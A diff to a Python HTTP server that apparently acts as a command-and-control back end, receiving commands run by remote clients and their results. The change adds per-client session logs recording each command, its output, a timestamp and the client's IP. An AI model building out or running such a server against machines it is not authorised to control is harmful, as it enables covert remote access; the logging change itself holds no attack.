@@ -7,9 +7,12 @@ import time
 import readline
 import re
 import os
+import argparse
 from collections import defaultdict
 import subprocess
 import getpass
+
+os.makedirs("session_logs", exist_ok=True)
 
 os.makedirs("tools", exist_ok=True)
 
@@ -82,6 +85,7 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
 
     def do_POST(self):
+        os.makedirs("session_logs", exist_ok=True)  # Ensure log directory exists
         length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(length).decode()
         fields = urllib.parse.parse_qs(post_data)
@@ -112,8 +116,15 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
             client_id = self.path.strip("/").split("/")[0]
             cmd = fields.get("cmd", [""])[0]
             result = fields.get("result", [""])[0]
+            client_ip = self.client_address[0]
             with lock:
                 client_results[client_id].append((cmd, result))
+                # Log to session_logs/<id>_<IP>.log
+                log_filename = os.path.join("session_logs", f"{client_id}_{client_ip}.log")
+                with open(log_filename, "a") as log_file:
+                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+                    log_file.write(f"[{timestamp}] CMD: {cmd}\n")
+                    log_file.write(f"[{timestamp}] RESULT:\n{result}\n\n")
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b"Result received")
@@ -121,6 +132,7 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
         else:
             self.send_response(404)
             self.end_headers()
+
 
 def format_table(data, headers):
     stripped_data = [[strip_ansi(str(cell)) for cell in row] for row in data]
